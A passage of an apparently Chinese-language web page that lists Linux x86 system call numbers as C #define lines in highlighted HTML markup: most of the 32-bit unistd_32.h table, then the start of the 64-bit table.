59</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_umask 60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chroot 61</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ustat 62</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup2 63</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getppid 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpgrp 65</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setsid 66</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigaction 67</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sgetmask 68</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ssetmask 69</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setreuid 70</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setregid 71</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigsuspend 72</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigpending 73</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sethostname 74</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setrlimit 75</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrlimit 76</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrusage 77</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_gettimeofday 78</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_settimeofday 79</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgroups 80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgroups 81</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_select 82</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_symlink 83</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_oldlstat 84</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readlink 85</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_uselib 86</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_swapon 87</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_reboot 88</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readdir 89</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mmap 90</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munmap 91</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_truncate 92</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ftruncate 93</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchmod 94</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchown 95</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpriority 96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setpriority 97</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_profil 98</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_statfs 99</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstatfs 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioperm 101</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_socketcall 102</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_syslog 103</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setitimer 104</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getitimer 105</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_stat 106</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lstat 107</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstat 108</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_olduname 109</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_iopl 110</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vhangup 111</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_idle 112</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vm86old 113</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_wait4 114</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_swapoff 115</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sysinfo 116</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ipc 117</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fsync 118</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigreturn 119</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clone 120</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setdomainname 121</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_uname 122</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_modify_ldt 123</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_adjtimex 124</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mprotect 125</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigprocmask 126</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_create_module 127</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_init_module 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_delete_module 129</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_kernel_syms 130</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_quotactl 131</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpgid 132</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchdir 133</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_bdflush 134</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sysfs 135</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_personality 136</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_afs_syscall 137</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsuid 138</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsgid 139</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR__llseek 140</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getdents 141</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR__newselect 142</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_flock 143</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msync 144</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readv 145</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_writev 146</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsid 147</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fdatasync 148</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR__sysctl 149</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlock 150</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munlock 151</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlockall 152</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munlockall 153</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setparam 154</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getparam 155</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setscheduler 156</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getscheduler 157</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_yield 158</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_get_priority_max 159</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_get_priority_min 160</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_rr_get_interval 161</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_nanosleep 162</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mremap 163</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresuid 164</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresuid 165</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vm86 166</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_query_module 167</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_poll 168</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_nfsservctl 169</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresgid 170</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresgid 171</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_prctl 172</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigreturn 173</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigaction 174</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigprocmask 175</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigpending 176</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigtimedwait 177</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigqueueinfo 178</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigsuspend 179</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pread64 180</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pwrite64 181</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chown 182</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getcwd 183</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_capget 184</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_capset 185</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigaltstack 186</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendfile 187</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpmsg 188</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_putpmsg 189</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vfork 190</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ugetrlimit 191</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mmap2 192</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_truncate64 193</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ftruncate64 194</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_stat64 195</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lstat64 196</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstat64 197</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lchown32 198</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getuid32 199</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgid32 200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_geteuid32 201</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getegid32 202</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setreuid32 203</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setregid32 204</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgroups32 205</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgroups32 206</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchown32 207</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresuid32 208</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresuid32 209</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresgid32 210</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresgid32 211</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chown32 212</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setuid32 213</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgid32 214</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsuid32 215</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsgid32 216</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pivot_root 217</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mincore 218</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_madvise 219</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getdents64 220</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fcntl64 221</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_gettid 224</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readahead 225</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setxattr 226</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lsetxattr 227</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fsetxattr 228</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getxattr 229</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lgetxattr 230</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fgetxattr 231</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_listxattr 232</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_llistxattr 233</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_flistxattr 234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_removexattr 235</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lremovexattr 236</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fremovexattr 237</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tkill 238</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendfile64 239</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_futex 240</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setaffinity 241</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getaffinity 242</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_thread_area 243</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_thread_area 244</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_setup 245</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_destroy 246</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_getevents 247</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_submit 248</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_cancel 249</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fadvise64 250</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_exit_group 252</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lookup_dcookie 253</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_create 254</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_ctl 255</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_wait 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_remap_file_pages 257</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_tid_address 258</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_create 259</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_settime 260</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_gettime 261</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_getoverrun 262</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_delete 263</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_settime 264</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_gettime 265</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_getres 266</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_nanosleep 267</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_statfs64 268</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstatfs64 269</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tgkill 270</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utimes 271</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fadvise64_64 272</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vserver 273</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mbind 274</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_mempolicy 275</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_mempolicy 276</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_open 277</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_unlink 278</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_timedsend 279</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_timedreceive 280</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_notify 281</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_getsetattr 282</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kexec_load 283</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_waitid 284</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_add_key 286</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_request_key 287</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_keyctl 288</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioprio_set 289</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioprio_get 290</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_init 291</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_add_watch 292</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_rm_watch 293</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_migrate_pages 294</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_openat 295</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mkdirat 296</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mknodat 297</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchownat 298</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_futimesat 299</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstatat64 300</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unlinkat 301</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_renameat 302</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_linkat 303</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_symlinkat 304</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readlinkat 305</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchmodat 306</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_faccessat 307</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pselect6 308</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ppoll 309</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unshare 310</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_robust_list 311</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_robust_list 312</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_splice 313</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sync_file_range 314</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tee 315</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vmsplice 316</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_move_pages 317</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getcpu 318</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_pwait 319</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utimensat 320</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_signalfd 321</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timerfd_create 322</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_eventfd 323</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fallocate 324</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timerfd_settime 325</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timerfd_gettime 326</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_signalfd4 327</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_eventfd2 328</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_create1 329</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup3 330</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pipe2 331</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_init1 332</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_preadv 333</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pwritev 334</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_tgsigqueueinfo 335</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_perf_event_open 336</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvmmsg 337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fanotify_init 338</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fanotify_mark 339</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_prlimit64 340</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_name_to_handle_at 341</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_open_by_handle_at 342</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_adjtime 343</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_syncfs 344</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendmmsg 345</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setns 346</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_process_vm_readv 347</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_process_vm_writev 348</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kcmp 349</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_finit_module 350</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setattr 351</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getattr 352</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_renameat2 353</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_seccomp 354</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrandom 355</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_memfd_create 356</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_bpf 357</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_execveat 358</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_socket 359</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_socketpair 360</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_bind 361</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_connect 362</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_listen 363</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_accept4 364</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsockopt 365</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setsockopt 366</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsockname 367</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpeername 368</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendto 369</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendmsg 370</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvfrom 371</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvmsg 372</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shutdown 373</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_userfaultfd 374</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_membarrier 375</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlock2 376</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_copy_file_range 377</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_preadv2 378</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pwritev2 379</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* _ASM_X86_UNISTD_32_H */</span></span></span><br></pre></td></tr></table></figure></div>
<h3 id="64-位"><a href="#64-位" class="headerlink" title="64 位"></a>64 位</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _ASM_X86_UNISTD_64_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _ASM_X86_UNISTD_64_H 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_read 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_write 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_open 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_close 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_stat 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstat 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lstat 6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_poll 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lseek 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mmap 9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mprotect 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munmap 11</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_brk 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigaction 13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigprocmask 14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigreturn 15</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioctl 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pread64 17</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pwrite64 18</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readv 19</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_writev 20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_access 21</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pipe 22</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_select 23</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_yield 24</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mremap 25</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msync 26</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mincore 27</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_madvise 28</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shmget 29</span></span><br><span 